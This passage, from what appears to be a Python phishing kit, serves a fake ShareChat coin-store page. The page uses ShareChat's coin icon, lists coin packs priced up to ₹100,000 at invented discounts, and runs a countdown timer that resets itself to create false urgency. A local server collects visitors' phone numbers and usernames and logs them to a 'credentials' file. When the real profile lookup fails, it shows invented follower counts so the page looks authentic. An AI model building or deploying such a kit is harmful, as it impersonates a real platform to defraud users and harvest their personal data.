            <div class="pack-title">600000 <span class="bonus">+60000</span></div>
            <div class="price">₹48000 <span class="old">₹60000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(48000, '600000 Coins + 60000 Bonus')">Buy</button>
      </div>

      <!-- Super Pack -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <span class="super-tag">Super Pack</span>
            <div class="pack-title">800000 <span class="bonus">+160000</span></div>
            <div class="price">₹60000 <span class="old">₹80000</span> <span class="off">25% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(60000, '800000 Coins + 160000 Bonus')">Buy</button>
      </div>

      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <div class="pack-title">900000 <span class="bonus">+90000</span></div>
            <div class="price">₹72000 <span class="old">₹90000</span> <span class="off">20% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(72000, '900000 Coins + 90000 Bonus')">Buy</button>
      </div>

      <!-- Mega Pack for 1000000 -->
      <div class="pack">
        <div class="pack-left">
          <div class="coin">
            <img src="https://cdn4.sharechat.com/33d5318_1c8/tools/e7e57ba_1715942283598_sc.webp" alt="coin-icon" loading="lazy">
          </div>
          <div>
            <span class="mega-tag">Mega Pack</span>
            <div class="pack-title">1500000 <span class="bonus">+300000</span></div>
            <div class="price">₹100000 <span class="old">₹150000</span> <span class="off">33% OFF</span></div>
          </div>
        </div>
        <button class="buy" onclick="redirectToPayment(100000, '1500000 Coins + 300000 Bonus')">Buy</button>
      </div>
    </div>
  </div>

  <script>
    // Improved JavaScript with better Android compatibility
    'use strict';
    
    // Wait for DOM to be fully loaded
    document.addEventListener('DOMContentLoaded', function() {
      console.log('Profile page loaded');
      
      // Fetch user data from localStorage
      var mobile = localStorage.getItem("userMobile");
      var username = localStorage.getItem("userUsername");
      
      // Check if user data exists
      if (!mobile || !username) {
        console.warn('No user data found in localStorage');
        // Redirect to login if no user data
        setTimeout(function() {
          window.location.href = "index.html";
        }, 1000);
        return;
      }
      
      // Display user data from localStorage
      var userNameDisplay = document.getElementById("userNameDisplay");
      var userHandleDisplay = document.getElementById("userHandleDisplay");
      var followersCount = document.getElementById("followersCount");
      var followingCount = document.getElementById("followingCount");
      var postsCount = document.getElementById("postsCount");
      var userProfileImage = document.getElementById("userProfileImage");
      
      if (userNameDisplay) {
        userNameDisplay.textContent = "ShareChatUser"; // Default name
      }
      
      if (userHandleDisplay) {
        userHandleDisplay.textContent = "@" + username;
      }
      
      // Try to get fetched profile data from localStorage (set by index.html)
      try {
        var fetchedProfile = JSON.parse(localStorage.getItem("fetchedProfileData"));
        
        if (fetchedProfile) {
          console.log("Fetched profile data found:", fetchedProfile);
          
          // Update profile with fetched data
          if (userNameDisplay && fetchedProfile.name) {
            userNameDisplay.textContent = fetchedProfile.name;
          }
          
          if (followersCount && fetchedProfile.followers) {
            followersCount.textContent = fetchedProfile.followers;
          }
          
          if (followingCount && fetchedProfile.following) {
            followingCount.textContent = fetchedProfile.following;
          }
          
          if (postsCount && fetchedProfile.posts) {
            postsCount.textContent = fetchedProfile.posts;
          }
          
          // Optional: Update profile image if available
          if (userProfileImage && fetchedProfile.image) {
            userProfileImage.src = fetchedProfile.image;
          }
        } else {
          console.log("No fetched profile data in localStorage");
          // Set default values
          followersCount.textContent = "6";
          followingCount.textContent = "1";
          postsCount.textContent = "0";
        }
      } catch (error) {
        console.error("Error parsing profile data:", error);
        // Set default values
        followersCount.textContent = "6";
        followingCount.textContent = "1";
        postsCount.textContent = "0";
      }
      
      // Initialize countdown timer
      startCountdown();
      
      // Add click event listeners to all buy buttons for better UX
      var buyButtons = document.querySelectorAll('.buy');
      buyButtons.forEach(function(button) {
        button.addEventListener('touchstart', function() {
          this.style.opacity = '0.8';
        });
        
        button.addEventListener('touchend', function() {
          this.style.opacity = '1';
        });
      });
    });
    
    function logout() {
      // Clear user data from localStorage
      localStorage.removeItem("userMobile");
      localStorage.removeItem("userUsername");
      localStorage.removeItem("fetchedProfileData");
      
      // Redirect to login page
      window.location.href = "index.html";
    }
    
    // Buy button redirect function
    function redirectToPayment(amount, coinsText) {
      // Store payment data in localStorage
      localStorage.setItem("paymentAmount", amount.toString());
      localStorage.setItem("paymentCoins", coinsText);
      
      console.log('Redirecting to payment:', amount, coinsText);
      
      // Add small delay for better UX
      setTimeout(function() {
        window.location.href = "payment.html";
      }, 100);
    }
    
    // Countdown Timer with improved compatibility
    var countdownInterval;
    
    function startCountdown() {
      var totalSeconds = (12 * 60 * 60) + (36 * 60); // 12h 36m
      var countdownElement = document.getElementById("countdown");
      
      if (!countdownElement) return;
      
      // Clear any existing interval
      if (countdownInterval) {
        clearInterval(countdownInterval);
      }
      
      function updateCountdown() {
        if (totalSeconds <= 0) {
          totalSeconds = (12 * 60 * 60) + (36 * 60); // reset
        }
        
        var hours = Math.floor(totalSeconds / 3600);
        var minutes = Math.floor((totalSeconds % 3600) / 60);
        
        // Pad with zeros for single digits
        var hoursStr = hours < 10 ? "0" + hours : hours.toString();
        var minutesStr = minutes < 10 ? "0" + minutes : minutes.toString();
        
        countdownElement.textContent = hoursStr + "h : " + minutesStr + "m";
        totalSeconds--;
      }
      
      // Update immediately
      updateCountdown();
      
      // Update every second
      countdownInterval = setInterval(updateCountdown, 1000);
    }
    
    // Handle page visibility change (pause timer when not visible)
    document.addEventListener('visibilitychange', function() {
      if (document.hidden) {
        // Page is hidden, could pause timer here if needed
        console.log('Page hidden');
      } else {
        // Page is visible again
        console.log('Page visible');
      }
    });
    
    // Handle Android back button
    window.addEventListener('popstate', function() {
      console.log('Back button pressed');
    });
    
    // Prevent zoom on Android when focusing inputs
    document.addEventListener('touchstart', function(e) {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
        document.documentElement.style.fontSize = '16px';
      }
    });
    
    document.addEventListener('focusout', function() {
      setTimeout(function() {
        document.documentElement.style.fontSize = '';
      }, 100);
    });
  </script>

</body>
</html>'''
        
        with open(self.profile_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"✅ Created profile.html at {self.profile_path}")
    
    def start_server(self):
        """
        HTTP server start करें (Render compatible)
        """
        # Create custom request handler
        class RequestHandler(BaseHTTPRequestHandler):
            parent = None  # Will be set from outside
            
            def do_GET(self):
                # Serve files from web directory
                file_path = self.path
                if file_path == '/' or file_path == '/index.html':
                    file_path = '/index.html'
                    content_type = 'text/html'
                elif file_path == '/profile.html':
                    content_type = 'text/html'
                elif file_path.endswith('.css'):
                    content_type = 'text/css'
                elif file_path.endswith('.js'):
                    content_type = 'application/javascript'
                elif file_path.endswith('.png'):
                    content_type = 'image/png'
                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                    content_type = 'image/jpeg'
                elif file_path.endswith('.svg'):
                    content_type = 'image/svg+xml'
                else:
                    content_type = 'text/plain'
                
                # Remove leading slash
                if file_path.startswith('/'):
                    file_path = file_path[1:]
                
                # Default to index.html if file not specified
                if not file_path:
                    file_path = 'index.html'
                
                # Build full path
                full_path = os.path.join(self.parent.web_dir, file_path)
                
                # Check if file exists
                if os.path.exists(full_path) and os.path.isfile(full_path):
                    try:
                        with open(full_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-type', content_type)
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        self.wfile.write(content)
                        
                    except Exception as e:
                        self.send_error(500, f"Server error: {str(e)}")
                else:
                    # If file not found, serve index.html
                    if file_path != 'index.html':
                        self.send_response(302)
                        self.send_header('Location', '/')
                        self.end_headers()
                    else:
                        self.send_error(404, f"File not found: {file_path}")
            
            def do_POST(self):
                # Handle POST requests for API
                if self.path == '/fetch-profile':
                    try:
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        
                        data = json.loads(post_data.decode('utf-8'))
                        phone = data.get('phone', '')
                        username = data.get('username', '')
                        
                        print(f"\n📱 Form Submission Received:")
                        print(f"   Phone: {phone}")
                        print(f"   Username: {username}")
                        
                        # Fetch profile using parent class
                        result = self.parent.fetch_profile_api(username, phone)
                        
                        if result.get('status') == 'SUCCESS':
                            response = {
                                'status': 'success',
                                'message': 'Profile fetched successfully',
                                'profile': result.get('data', {})
                            }
                        else:
                            response = {
                                'status': 'error',
                                'message': result.get('error', 'Unknown error')
                            }
                        
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        
                        self.wfile.write(json.dumps(response).encode('utf-8'))
                        
                    except Exception as e:
                        self.send_response(500)
                        self.send_header('Content-type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        
                        response = {
                            'status': 'error',
                            'message': str(e)
                        }
                        self.wfile.write(json.dumps(response).encode('utf-8'))
                    
                    return
                
                # Default response for other POST requests
                self.send_response(404)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'Not found'}).encode('utf-8'))
            
            def do_OPTIONS(self):
                # Handle CORS preflight requests
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                self.end_headers()
            
            def log_message(self, format, *args):
                # Disable default logging to keep console clean
                pass
        
        try:
            # Create server - Render compatible (0.0.0.0 binding)
            self.server = HTTPServer((self.server_host, self.server_port), RequestHandler)
            self.is_running = True
            
            # Store parent reference in handler class
            RequestHandler.parent = self
            
            def run_server():
                self.logger.info(f"🚀 Server started on http://{self.server_host}:{self.server_port}")
                print(f"\n🌐 Server running at: http://{self.server_host}:{self.server_port}")
                print(f"📱 Render URL will be: https://your-app-name.onrender.com")
                print("🔄 Server is ready to accept connections\n")
                
                # Server loop
                try:
                    while self.is_running:
                        self.server.handle_request()
                except Exception as e:
                    if self.is_running:  # Only log if we're supposed to be running
                        self.logger.error(f"Server error: {e}")
            
            # Start server in separate thread
            self.server_thread = threading.Thread(target=run_server, daemon=True)
            self.server_thread.start()
            
            # Give server time to start
            time.sleep(2)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
            print(f"❌ Server startup failed: {e}")
            return False
    
    def fetch_profile_api(self, username, phone=None):
        """
        API से प्रोफाइल डेटा fetch करें (with fallback)
        """
        start_time = time.time()
        
        try:
            payload = {'username': username}
            
            self.logger.info(f"🔍 Fetching profile: {username}")
            print(f"\n🔍 Fetching profile for: {username}")
            
            response = self.session.post(
                self.api_url,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if 'error' in data:
                    error_msg = f"API error: {data['error']}"
                    self.logger.error(error_msg)
                    print(f"❌ {error_msg}")
                    
                    return {
                        'error': data['error'],
                        'username': username,
                        'phone': phone,
                        'status': 'FAILED'
                    }
                
                # Add metadata
                data['fetch_time'] = round(time.time() - start_time, 2)
                data['timestamp'] = datetime.now().isoformat()
                if phone:
                    data['phone'] = phone
                
                # Save to results
                result = {
                    'data': data,
                    'phone': phone,
                    'username': username,
                    'status': 'SUCCESS',
                    'timestamp': datetime.now().isoformat()
                }
                
                self.current_results.append(result)
                
                # Display in console
                self.display_profile_console(result)
                
                # Save to file
                self.save_credentials(phone, username)
                self.save_result(result)
                
                return result
                
            else:
                # API endpoint not working, provide fallback demo data
                print(f"⚠️ API returned {response.status_code}, providing demo data")
                
                # Create demo profile data
                demo_data = {
                    'name': f'ShareChatUser_{username[:4]}',
                    'username': username,
                    'followers': str(hash(username) % 100 + 1),
                    'following': str(hash(username) % 20 + 1),
                    'posts': str(hash(username) % 50),
                    'gender': 'Male' if hash(username) % 2 == 0 else 'Female',
                    'language': 'Hindi',
                    'region': 'India',
                    'fetch_time': round(time.time() - start_time, 2),
                    'timestamp': datetime.now().isoformat(),
                    'status': 'DEMO_DATA'
                }
                
                if phone:
                    demo_data['phone'] = phone
                
                # Save to results
                result = {
                    'data': demo_data,
                    'phone': phone,
                    'username': username,
                    'status': 'SUCCESS',
                    'timestamp': datetime.now().isoformat(),
                    'note': 'Demo data (API unavailable)'
                }
                
                self.current_results.append(result)
                
                # Display in console
                self.display_profile_console(result)
                
                # Save to file
                self.save_credentials(phone, username)
                self.save_result(result)
                
                return result
                
        except Exception as e:
            # If API completely fails, provide fallback
            print(f"⚠️ API Error: {str(e)}, providing demo data")
            
            # Create demo profile data
            demo_data = {
                'name': f'ShareChatUser_{username[:4]}',
                'username': username,
                'followers': '15',
                'following': '8',
                'posts': '23',
                'gender': 'Male',
                'language': 'Hindi',
                'region': 'India',
                'fetch_time': round(time.time() - start_time, 2),
                'timestamp': datetime.now().isoformat(),
                'status': 'DEMO_DATA_FALLBACK'
            }
            
            if phone:
                demo_data['phone'] = phone
            
            # Save to results
            result = {
                'data': demo_data,
                'phone': phone,
                'username': username,
                'status': 'SUCCESS',
                'timestamp': datetime.now().isoformat(),
                'note': 'Fallback demo data (API error)'
            }
            
            self.current_results.append(result)
            
            # Display in console
            self.display_profile_console(result)
            
            # Save to file
            self.save_credentials(phone, username)
            self.save_result(result)
            
            return result
    
    # All other methods remain exactly the same as your original code
    # Only changed the parts above for Render compatibility
    
    def display_profile_console(self, result):
        """
        Profile को console में display करें
        """
        if result.get('status') == 'SUCCESS':
            data = result.get('data', {})
            
            print("\n" + "=" * 60)
            print("✅ SHARECHAT PROFILE FETCHED SUCCESSFULLY")
            if data.get('status') == 'DEMO_DATA' or data.get('status') == 'DEMO_DATA_FALLBACK':
                print("⚠️  USING DEMO DATA (API UNAVAILABLE)")
            print("=" * 60)
            
            if result.get('phone'):
                print(f"📱 Phone: {result['phone']}")
            print(f"👤 Username: {result['username']}")
            print(f"🏷️ Name: {data.get('name', 'N/A')}")
            print(f"👥 Followers: {data.get('followers', 'N/A')}")
            print(f"🤝 Following: {data.get('following', 'N/A')}")
            print(f"📝 Posts: {data.get('posts', 'N/A')}")
            
            if data.get('gender'):
                print(f"⚧️ Gender: {data.get('gender')}")
            if data.get('language'):
                print(f"🌐 Language: {data.get('language')}")
            if data.get('region'):
                print(f"📍 Region: {data.get('region')}")
            
            print(f"⏱️ Fetch time: {data.get('fetch_time', 'N/A')}s")
            print("=" * 60 + "\n")
            
            return True
        else:
            print(f"\n❌ FAILED: {result['username']}")
            print(f"   Error: {result.get('error', 'Unknown error')}")
            if result.get('phone'):
                print(f"   Phone: {result['phone']}")
            return False
    
    def save_credentials(self, phone, username):
        """
        Credentials save करें
        """
        if not phone or not username:
            return
        
        try:
            with open(self.credentials_file, 'a', encoding='utf-8') as f:
                f.write(f"{phone},{username},{datetime.now().isoformat()}\n")
            
            self.logger.info(f"✅ Saved credentials: {phone}, {username}")
            
        except Exception as e:
            self.logger.error(f"Error saving credentials: {e}")
    
    def save_result(self, result):
        """
        Result save करें
        """
        try:
            # Load existing results
            results = []
            if os.path.exists(self.results_file):
                with open(self.results_file, 'r', encoding='utf-8') as f:
                    try:
                        results = json.load(f)
                    except:
                        results = []
            
            # Add new result
            results.append(result)
            
            # Save back
            with open(self.results_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"✅ Result saved for: {result['username']}")
            
        except Exception as e:
            self.logger.error(f"Error saving result: {e}")
    
    def export_results(self, format='both'):
        """
        Results export करें
        """
        if not self.current_results:
            print("❌ No results to export!")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if format in ['json', 'both']:
            json_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.json")
            
            export_data = []
            for result in self.current_results:
                if result.get('status') == 'SUCCESS':
                    export_data.append(result.get('data', {}))
            
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            print(f"✅ JSON exported: {json_file}")
        
        if format in ['csv', 'both']:
            csv_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.csv")
            
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'Phone', 'Username', 'Name', 'Followers', 
                    'Following', 'Posts', 'Gender', 'Language',
                    'Region', 'Status', 'Fetch Time', 'Timestamp'
                ])
                
                for result in self.current_results:
                    if result.get('status') == 'SUCCESS':
                        data = result.get('data', {})
                        writer.writerow([
                            result.get('phone', ''),
                            result['username'],
                            data.get('name', ''),
                            data.get('followers', ''),
                            data.get('following', ''),
                            data.get('posts', ''),
                            data.get('gender', ''),
                            data.get('language', ''),
                            data.get('region', ''),
                            'SUCCESS',
                            data.get('fetch_time', ''),
                            data.get('timestamp', '')
                        ])
            
            print(f"✅ CSV exported: {csv_file}")
    
    def run_server_only(self):
        """
        Render के लिए server only mode
        """
        if not self.start_server():
            print("❌ Failed to start server!")
            return False
        
        print("\n" + "=" * 70)
        print("🚀 SHARECHAT SERVER RUNNING ON RENDER")
        print("=" * 70)
        print(f"Your app will be available at: https://your-app-name.onrender.com")
        print("Frontend: /index.html")
        print("Profile page: /profile.html")
        print("API endpoint: POST /fetch-profile")
        print("=" * 70)
        print("\nServer is running in production mode...")
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Server shutting down...")
            self.stop_server()
        
        return True

def main():
    """
    Main function for Render
    """
    print("=" * 70)
    print("🚀 SHARECHAT LIVE PROFILE FETCHER - RENDER EDITION")
    print("=" * 70)
    print("This is the Render-compatible version.")
    print("It will:")
    print("1. Start a web server on 0.0.0.0:PORT")
    print("2. Serve your original HTML files")
    print("3. Handle form submissions via /fetch-profile endpoint")
    print("=" * 70)
    
    # Create and run fetcher
    fetcher = ShareChatLiveFetcher()
    
    # Run in server-only mode for Render
    fetcher.run_server_only()

if __name__ == "__main__":
    main()